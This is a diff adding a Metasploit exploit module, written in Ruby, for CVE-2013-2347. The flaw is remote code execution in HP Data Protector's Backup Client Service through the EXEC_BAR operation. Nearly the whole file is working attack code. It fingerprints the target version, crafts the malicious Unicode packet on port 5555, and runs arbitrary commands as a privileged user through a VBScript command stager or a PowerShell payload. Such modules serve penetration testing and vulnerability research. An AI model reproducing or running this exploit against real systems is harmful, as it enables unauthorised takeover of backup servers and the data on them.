@@ -1,0 +1,206 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::CmdStagerVBS
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'HP Data Protector Backup Client Service Remote Code Execution',
+      'Description'    => %q{
+        This module abuses the Backup Client Service (OmniInet.exe) to achieve remote code
+        execution. The vulnerability exists in the EXEC_BAR operation, which allows to
+        execute arbitrary processes. This module has been tested successfully on HP Data
+        Protector 6.20 on Windows 2003 SP2 and Windows 2008 R2.
+      },
+      'Author'         =>
+        [
+          'Aniway.Anyway <Aniway.Anyway[at]gmail.com>', # Vulnerability discovery
+          'juan vazquez' # Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2013-2347' ],
+          [ 'BID', '64647' ],
+          [ 'ZDI', '14-008' ],
+          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03822422' ],
+          [ 'URL', 'http://ddilabs.blogspot.com/2014/02/fun-with-hp-data-protector-execbar.html' ]
+        ],
+      'Privileged'     => true,
+      'Payload'        =>
+        {
+          'DisableNops' => true
+        },
+      'DefaultOptions'  =>
+        {
+          'DECODERSTUB' => File.join(Msf::Config.data_directory, "exploits", "cmdstager", "vbs_b64_noquot")
+        },
+      'Platform'        => 'win',
+      'Targets'         =>
+        [
+          [ 'HP Data Protector 6.20 build 370 / VBScript CMDStager', { } ],
+          [ 'HP Data Protector 6.20 build 370 / Powershell', { } ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Jan 02 2014'))
+
+    register_options(
+      [
+        Opt::RPORT(5555),
+        OptString.new('CMDPATH', [true, 'The cmd.exe path', 'c:\\windows\\system32\\cmd.exe'])
+      ],
+    self.class)
+  end
+
+  def check
+    fingerprint = get_fingerprint
+
+    if fingerprint.nil?
+      return Exploit::CheckCode::Unknown
+    end
+
+    print_status("#{peer} - HP Data Protector version #{fingerprint}")
+
+    if fingerprint =~ /HP Data Protector A\.06\.(\d+)/
+      minor = $1.to_i
+    else
+      return Exploit::CheckCode::Safe
+    end
+
+    if minor < 21
+      return Exploit::CheckCode::Appears
+    elsif minor == 21
+      return Exploit::CheckCode::Detected
+    else
+      return Exploit::CheckCode::Detected
+    end
+
+  end
+
+  def exploit
+    if target.name =~ /VBScript CMDStager/
+      # 7500 just in case, to be sure the command fits after
+      # environment variables expansion
+      execute_cmdstager({:linemax => 7500})
+    elsif target.name =~ /Powershell/
+      # Environment variables are not being expanded before, neither in CreateProcess
+      command = cmd_psh_payload(payload.encoded).gsub(/%COMSPEC% /, "")
+      if command.length > 8000
+        # Windows 2008 Command Prompt Max Length is 8191
+        fail_with(Failure::BadConfig, "#{peer} - The selected paylod is too long to execute through powershell in one command")
+      end
+      print_status("#{peer} - Exploiting through Powershell...")
+      exec_bar(datastore['CMDPATH'], command, "\x00")
+    end
+  end
+
+  def peer
+    "#{rhost}:#{rport}"
+  end
+
+  def build_pkt(fields)
+    data = "\xff\xfe" # BOM Unicode
+    fields.each do |v|
+      data << "#{Rex::Text.to_unicode(v)}\x00\x00"
+      data << Rex::Text.to_unicode(" ") # Separator
+    end
+
+    data.chomp!(Rex::Text.to_unicode(" ")) # Delete last separator
+    return [data.length].pack("N") + data
+  end
+
+  def get_fingerprint
+    ommni = connect
+    ommni.put(rand_text_alpha_upper(64))
+    resp = ommni.get_once(-1)
+    disconnect
+
+    if resp.nil?
+      return nil
+    end
+
+    Rex::Text.to_ascii(resp).chop.chomp # Delete unicode last null
+  end
+
+  def exec_bar(cmd, *args)
+    connect
+    pkt = build_pkt([
+      "2", # Message Type
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      "11", # Opcode EXEC_BAR
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      "#{cmd}", # Executable
+      rand_text_alpha(8)
+    ].concat(args))
+    sock.put(pkt)
+    # In my testings the default timeout (10) isn't enough
+    begin
+      res = sock.get_once(-1, 20)
+    rescue EOFError # happens when using the Powershell method
+      disconnect
+      return
+    end
+    fail_with(Failure::Unknown, "#{peer} - Expected answer not received... aborting...") unless exec_bar?(res)
+    disconnect
+  end
+
+  def exec_bar?(data)
+    return false if data.blank?
+    data_unpacked = data.unpack("NnVv")
+    data_unpacked.length == 4 && data_unpacked[0] == 8 && data_unpacked[1] == 0xfffe && data_unpacked[2] == 0x36 && data_unpacked[3] == 0
+  end
+
+  def execute_command(cmd, opts = {})
+    exec_bar(datastore['CMDPATH'], "/c #{cmd}", "\x00")
+  end
+
+  def get_vbs_string(str)
+    vbs_str = ""
+    str.each_byte { |b|
+      vbs_str << "Chr(#{b})+"
+    }
+
+    return vbs_str.chomp("+")
+  end
+
+  # Make the modifications required to the specific encoder
+  # This exploit uses an specific encoder because quotes (")
+  # aren't allowed when injecting commands
+  def execute_cmdstager_begin(opts)
+    var_decoded = @stager_instance.instance_variable_get(:@var_decoded)
+    var_encoded = @stager_instance.instance_variable_get(:@var_encoded)
+    decoded_file = "#{var_decoded}.exe"
+    encoded_file = "#{var_encoded}.b64"
+    @cmd_list.each do |command|
+      # Because the exploit kills cscript processes to speed up and reliability
+      command.gsub!(/cscript \/\/nologo/, "wscript //nologo")
+      command.gsub!(/CHRENCFILE/, get_vbs_string(encoded_file))
+      command.gsub!(/CHRDECFILE/, get_vbs_string(decoded_file))
+    end
+  end
+
+end
